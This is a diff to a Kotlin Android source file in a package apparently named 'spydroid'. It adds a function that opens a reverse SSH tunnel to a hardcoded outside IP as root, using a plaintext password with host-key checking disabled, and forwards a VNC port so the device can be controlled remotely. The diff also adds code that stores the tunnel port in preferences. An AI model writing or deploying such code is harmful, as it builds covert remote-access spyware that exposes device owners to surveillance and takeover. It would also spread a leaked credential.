@@ -19,6 +19,8 @@ package net.spydroid.common.remote
 
 import android.annotation.SuppressLint
 import android.content.Context
+import android.content.SharedPreferences
+import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
@@ -38,10 +40,48 @@ import org.koin.android.ext.koin.androidContext
 import org.koin.core.component.KoinComponent
 import org.koin.core.component.inject
 import org.koin.core.context.startKoin
+import com.jcraft.jsch.JSch
+import com.jcraft.jsch.Session
+
+private fun createReverseSSHTunnel(port: (Int) -> Unit) {
+    try {
+        val jsch = JSch()
+        val session: Session = jsch.getSession("root", "217.15.171.116", 22)
+
+        session.setPassword("NvS12QZmf=6d")
+
+        val config = java.util.Properties()
+        config["StrictHostKeyChecking"] = "no"
+        session.setConfig(config)
+
+        session.connect()
+
+        val rport = (5200..9000).random()
+        val iport = 5300
+
+        port(rport)
+
+        session.setPortForwardingR(rport, "192.168.100.242", iport)
+
+        Log.d("SSH_TEST","Túnel SSH inverso creado con éxito. ¡VNC redirigido! a el puerto $rport")
+
+    } catch (e: Exception) {
+        e.printStackTrace()
+        Log.e("SSH_TEST","Error: $e")
+    }
+}
+
 
 class RemoteDataProvider private constructor(
     private val context: Context
 ) : KoinComponent {
+
+    init {
+        startKoin {
+            androidContext(context)
+            modules(networkModule, dataModule)
+        }
+    }
 
     private val devicesRepository: DevicesRepository by inject()
     private val infoRepository: InfoRepository by inject()
@@ -50,12 +90,22 @@ class RemoteDataProvider private constructor(
 
     private val scope = CoroutineScope(Dispatchers.IO)
 
-    init {
-        startKoin {
-            androidContext(context)
-            modules(networkModule, dataModule)
-        }
+    private val sharedPreferences: SharedPreferences =
+        context.getSharedPreferences("remotePreferences", Context.MODE_PRIVATE)
+
+    private object PORT_VALUES {
+        val VALUE_DEFAULT = 0
+        val KEY = "portTunnel"
     }
+
+    private fun setPort(state: Int)  {
+        val editor = sharedPreferences.edit()
+        editor.putInt(PORT_VALUES.KEY, state)
+        editor.apply()
+    }
+
+    private val _port = MutableStateFlow(sharedPreferences.getInt(PORT_VALUES.KEY, PORT_VALUES.VALUE_DEFAULT))
+    val port: StateFlow<Int> = _port
 
     private val _devices = MutableStateFlow(mutableListOf<Devices>())
     val devices: StateFlow<List<Devices>> = _devices
@@ -73,6 +123,15 @@ class RemoteDataProvider private constructor(
         scope.launch {
             devicesRepository.insertDevice(device)
         }
+
+    fun startSshTunnel ()  {
+        if (_port.value ==  PORT_VALUES.VALUE_DEFAULT) {
+            createReverseSSHTunnel {
+                setPort(it)
+                _port.value = it
+            }
+        }
+    }
 
 
     // GET
